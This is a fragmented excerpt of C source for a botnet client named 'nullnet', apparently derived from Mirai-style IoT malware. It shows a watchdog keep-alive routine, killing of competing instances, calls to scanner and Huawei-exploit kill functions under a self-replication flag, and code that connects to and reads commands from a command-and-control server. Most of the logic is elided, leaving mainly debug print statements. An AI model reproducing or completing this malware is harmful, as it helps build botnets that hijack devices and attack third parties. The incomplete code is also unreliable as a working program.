...
void (*resolve_func)(void) = (void (*)(void))util_local_addr;
	...
	{
		printf("[nullnet/main] got SIGSEGV at address: 0x%lx\n", (long) si->si_addr);
		exit(EXIT_FAILURE);
	}
#endif
...
void ioctl_keepalive(void)
{
	...
	{
		#ifdef DEBUG
			printf("[nullnet/main/ioctl] found a driver on the device\n");
		#endif
		found = TRUE;
	...
	if(found)
	{
		...
		{
			#ifdef DEBUG
				printf("[nullnet/main/ioctl] sending keep-alive ioctl call to the driver\n");
			#endif
	...
	#ifdef DEBUG
		printf("[nullnet/main/ioctl] driver not found\n");
	#endif
...
int main(int argc, char **args)
{
	...
	#ifdef DEBUG
		printf("[nullnet/main] debug mode, pid: %d\n", getpid());
	...
	while (TRUE)
	{
		...
		{
#ifdef DEBUG
			printf("[nullnet/main] select() errno = %d\n", errno);
#endif
			continue;
		}
		else if (nfds == 0)
...
#ifdef DEBUG
			printf("[nullnet/main] detected newer instance running! killing process\n");
#endif
			#ifdef NULLNET_SELF_REP
			scanner_kill();
			huawei_kill();
		...
		if(pending_connection)
		{
			...
			{
				#ifdef DEBUG
					printf("[nullnet/main] timed out while connecting to cnc\n");
				#endif
				teardown_connection();
			}
			else
			{
				...
				{
					#ifdef DEBUG
						printf("[nullnet/main] error while connecting to cnc, code=%d\n", err);
					#endif
					close(fd_serv);
					fd_serv = -1;
				...
				else
				{
					...
					#ifdef DEBUG
						printf("[nullnet/main] connected to cnc successfully\n");
					#endif
				}
			}
		}
		else if(fd_serv != -1 && FD_ISSET(fd_serv, &fdsetrd))
		{
			...
			{
				#ifdef DEBUG
					printf("[nullnet/main] lost connection with cnc (errno = %d) 1\n", errno);
				#endif
				teardown_connection();
				continue;
			}
			...
			{
				#ifdef DEBUG
					printf("[nullnet/main] lost connection with cnc (errno = %d) 2\n", errno);
				#endif
				teardown_connection();
				continue;
			}
			...
			#ifdef DEBUG
				printf("[nullnet/main] received %d bytes from cnc\n", len);
			#endif
...
{
	#ifdef DEBUG
		printf("[nullnet/main] attempting to connect to cnc\n");
	#endif

	if((fd_serv = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		#ifdef DEBUG
			printf("[nullnet/main] failed to call socket(). errno = %d\n", errno);
		#endif
		return;
	}
...
{
	#ifdef DEBUG
		printf("[nullnet/main] tearing down connection to cnc!\n");
	#endif
